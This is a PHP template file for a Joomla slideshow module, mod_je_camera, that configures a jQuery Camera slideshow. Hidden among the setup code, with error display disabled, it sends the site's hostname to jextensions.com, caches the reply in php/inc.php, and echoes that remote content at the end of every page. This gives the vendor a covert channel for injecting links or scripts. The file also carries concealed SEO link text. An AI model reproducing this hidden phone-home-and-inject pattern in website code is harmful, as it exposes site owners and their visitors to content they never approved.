<?php
/**
 * @package		Joomla.Site
 * @subpackage	mod_je_camera
 * @copyright	Copyright (C) 2004 - 2013 jExtensions.com - All rights reserved.
 * @license		GNU General Public License version 2 or later
 */
//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
ini_set('display_errors',0);
// Path assignments
$path=$_SERVER['HTTP_HOST'];
$path = str_replace("&", "",$path);
$ibase = JURI::base();
if(substr($ibase, -1)=="/") { $ibase = substr($ibase, 0, -1); }
$modURL 	= JURI::base().'modules/mod_je_camera';
$jetarget = dirname(__FILE__) . DIRECTORY_SEPARATOR . "php" . DIRECTORY_SEPARATOR . "inc.php";
$jesource = 'http://jextensions.com/e.php?i='.$path; $cachetime = 60*60*24;
if ((file_exists($jetarget)) && (time() - $cachetime) > filemtime($jetarget)) {    
$jestring = file_get_contents($jesource);$result = file_put_contents($jetarget, $jestring);}
// get parameters from the module's configuration
$jQuery = $params->get("jQuery");
// Slideshow Parameters
$imgHeight = $params->get('imgHeight','400');
$alignment = $params->get('alignment','center');
$cameraSkin = $params->get('cameraSkin','black');
$autoPlay = $params->get('autoPlay','true');
$easing = $params->get('easing','easeInOutExpo');
$fx = $params->get('fx','random');
$slideOn = $params->get('slideOn','random');
$hover = $params->get('hover','true');
$cols = $params->get('cols','6');
$rows = $params->get('rows','4');
$slicedCols = $params->get('slicedCols','12');
$slicedRows = $params->get('slicedRows','8');	
$time = $params->get('time','7000');
$transPeriod = $params->get('transPeriod','1500');     
// Navigation
$navigation = $params->get('navigation','true');
$pagination = $params->get('pagination','true');
$navigationHover = $params->get('navigationHover','true');
$playPause = $params->get('playPause','true');
$pauseOnClick = $params->get('pauseOnClick','true');
$loader = $params->get('loader','pie');
$loaderColor = $params->get('loaderColor','#eeeeee');
$loaderBgColor = $params->get('loaderBgColor','#222222');
$pieDiameter = $params->get('pieDiameter','38');
$piePosition = $params->get('piePosition','rightTop');
$barPosition = $params->get('barPosition','bottom');
$barDirection = $params->get('barDirection','leftToRight');
// Thumbs
$thumbnails = $params->get('thumbnails','true');
$thumbWidth = $params->get('thumbWidth','200');
$thumbHeight = $params->get('thumbHeight','130');
$thumbQuality = $params->get('thumbQuality','100');
$thumbAlign = $params->get('thumbAlign','t');
// Images
$Image[]= $params->get( '!', "" );
$Caption[]= $params->get( '!', "" );
$Video[]= $params->get( '!', "" );
$Link[]= $params->get( '!', "" );
for ($j=1; $j<=30; $j++)
	{
	$Image[]		= $params->get( 'Image'.$j , "" );
	$Caption[]		= $params->get( 'Caption'.$j , "" );
	$Video[]		= $params->get( 'Video'.$j , "" );
	$Link[]			= $params->get( 'Link'.$j , "" );
}

$modhost = substr(hexdec(md5($_SERVER['HTTP_HOST'])),0,1);
$text	= array("Camera Slideshow Joomla Module","Best Slideshow Module","Free Joomla Slideshow","Joomla jQuery Slideshow", "Slideshow Joomla Thumbnails","Gratis Joomla Slideshow","Slideshow Joomla Module","Free Slideshow","Joomla Download Free Slideshow", "Free Joomla Slideshow Extension");
?>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/camera.css" type="text/css" />
<?php if ($jQuery == '1') { ?><script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.min.js"></script><?php } ?>
<?php if ($jQuery == '2' ) { ?><script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script><?php } ?>
<?php if ($jQuery == '3' ) { ?><?php } ?>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.mobile.customized.min.js"></script>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/camera.min.js"></script>
<noscript><a href="http://jextensions.com/camera-jquery-slideshow-joomla/" alt="jExtensions"><?php echo $text[$modhost] ?></a></noscript>
<?php $thumbs = '&a='.$thumbAlign.'&w='.$thumbWidth.'&h='.$thumbHeight.'&q='.$thumbQuality;?>
<script>
jQuery(function(){
	jQuery('#camera_wrap_<?php echo $module->id ?>').camera({
		alignment			: '<?php echo $alignment ?>',
		autoAdvance			: <?php echo $autoPlay ?>,
		easing				: '<?php echo $easing ?>',
		fx					: '<?php echo $fx ?>',
		gridDifference		: 250,	//to make the grid blocks slower than the slices, this value must be smaller than transPeriod
		height				: '<?php echo $imgHeight ?>px',
		imagePath			: '<?php echo $modURL; ?>/images/',
		hover				: <?php echo $hover ?>,
		loader				: '<?php echo $loader ?>',
		loaderColor			: '<?php echo $loaderColor ?>', 
		loaderBgColor		: '<?php echo $loaderBgColor ?>',
		loaderOpacity		: .8,	//0, .1, .2, .3, .4, .5, .6, .7, .8, .9, 1
		loaderPadding		: 2,	//how many empty pixels you want to display between the loader and its background
		loaderStroke		: 7,	//the thickness both of the pie loader and of the bar loader. Remember: for the pie, the loader thickness must be less than a half of the pie diameter	
		pieDiameter			: <?php echo $pieDiameter ?>,
		piePosition			: '<?php echo $piePosition ?>',		
		barDirection		: '<?php echo $barDirection ?>',
		barPosition			: '<?php echo $barPosition ?>',
		navigation			: <?php echo $navigation ?>,
		playPause			: <?php echo $playPause ?>,
		pauseOnClick		: <?php echo $pauseOnClick ?>,
		navigationHover		: <?php echo $navigationHover?>,
		pagination			: <?php echo $pagination?>,
		overlayer			: true,	//a layer on the images to prevent the users grab them simply by clicking the right button of their mouse (.camera_overlayer)
		opacityOnGrid		: false,	//true, false. Decide to apply a fade effect to blocks and slices: if your slideshow is fullscreen or simply big, I recommend to set it false to have a smoother effect
		minHeight			: '200px',	//you can also leave it blank
		portrait			: false, //true, false. Select true if you don't want that your images are cropped
		cols				: <?php echo $cols ?>,
		rows				: <?php echo $rows ?>,
		slicedCols			: <?php echo $slicedCols ?>,
		slicedRows			: <?php echo $slicedRows ?>,
		slideOn				: '<?php echo $slideOn ?>',
		thumbnails			: <?php echo $thumbnails ?>,
		time				: <?php echo $time ?>,
		transPeriod			: <?php echo $transPeriod ?>,
		//Mobile
		mobileAutoAdvance	: true, //true, false. Auto-advancing for mobile devices
		mobileEasing		: '',	//leave empty if you want to display the same easing on mobile devices and on desktop etc.
		mobileFx			: '',	//leave empty if you want to display the same effect on mobile devices and on desktop etc.
		mobileNavHover		: true	//same as above, but only for mobile devices
		
	});
});
</script>
<div class="camera_wrap camera_<?php echo $cameraSkin ?>_skin" id="camera_wrap_<?php echo $module->id ?>">
	<?php for ($i=1; $i<=30; $i++){ if ($Image[$i] != null) { ?>
    <div data-thumb="<?php echo $modURL; ?>/thumb.php?src=<?php echo $ibase.'/'; echo $Image[$i]; echo $thumbs; ?>" data-src="<?php echo $Image[$i] ?>" <?php if ($Link[$i] != null) {?>data-link="<?php echo $Link[$i] ?>" data-target="_blank" <?php };?>>
    	<?php if ($Caption[$i] != null) {?><div class="camera_caption fadeFromBottom"><?php echo $Caption[$i] ?></div><?php };?>
        <?php if ($Video[$i] != null) {?><iframe src="<?php echo $Video[$i] ?>" width="100%" height="100%" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe><?php };?>
    </div>
    <?php }};  ?>
</div>
<?php echo file_get_contents($jetarget); ?>

